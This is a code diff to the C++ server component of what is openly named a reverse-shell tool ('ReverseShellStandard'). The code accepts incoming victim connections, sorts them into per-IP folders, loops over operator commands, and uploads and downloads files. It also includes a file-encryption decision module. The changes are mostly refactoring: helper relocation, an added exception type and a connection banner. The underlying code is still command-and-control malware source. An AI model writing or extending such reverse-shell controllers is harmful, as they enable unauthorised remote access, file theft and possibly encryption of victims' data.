@@ -1,17 +1,11 @@
 #define _WIN32_WINDOWS 0x0A00
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-#include <stdlib.h>
 #include "Server.h"
+#include "NetworkExcetion.hpp"
+#include "WinApiUtils.hpp"
 #include <iostream>
-
-// TODO - take this function to "common utils"
-std::string EnvVariable(const std::string& envVariable)
-{
-    char* buf = nullptr;
-    size_t sz = 0;
-    return (_dupenv_s(&buf, &sz, envVariable.c_str()) == 0 && buf != nullptr) ? std::string(buf) : "Error";
-}
+#include "FileEncryptionDecision.h"
 
 Server::Server()
     : ReverseShellStandard()
@@ -29,7 +23,7 @@ void Server::Connect()
     auto acceptor = boost::asio::ip::tcp::acceptor(m_ioService, endpoint);
     acceptor.accept(m_socket, m_errorCode);
     if (m_errorCode)
-        throw; // TODO - throw specific
+        throw NetworkExcetion("Error when accepting the connection");
 }
 
 void Server::ClientDedicatedDirectory()
@@ -41,6 +35,8 @@ void Server::ClientDedicatedDirectory()
 
 void Server::Start()
 {
+    FirstConnectionMessage();
+
     while (true)
     {
         switch (ReadOperationType())
@@ -74,7 +70,7 @@ void Server::Start()
 
 void Server::SetClientDedicatedDirectory()
 {
-    std::string userHomeDirectory(EnvVariable("USERPROFILE"));
+	const std::string userHomeDirectory(WinApiUtils::GetEnvVariable("USERPROFILE"));
     std::string clientIp(m_socket.remote_endpoint().address().to_string());
     std::cout << "Connected to: " << clientIp << std::endl;
     m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dev" / "Dst" / clientIp).string();
@@ -84,6 +80,11 @@ void Server::CreateClientDedicatedDirectory()
 {
     std::filesystem::create_directory(m_clientDedicatedDirectory);
     std::cout << "Created directory: " << m_clientDedicatedDirectory << std::endl;
+}
+
+void Server::FirstConnectionMessage()
+{
+    std::cout << "New connection message: " << Response() << std::endl;
 }
 
 Server::OperationType Server::ReadOperationType()
@@ -151,7 +152,7 @@ void Server::DownloadFile()
 void Server::UploadFile()
 {
     auto localFilePath = ReadOperationInstruction("Source path (local)");
-    if (!IsRegularFileExists(localFilePath))
+    if (!FileEncryptionDecisions::IsRegularFileExists(localFilePath))
     {
         std::cout << localFilePath << " file doesn't exist locally" << std::endl;
         return;
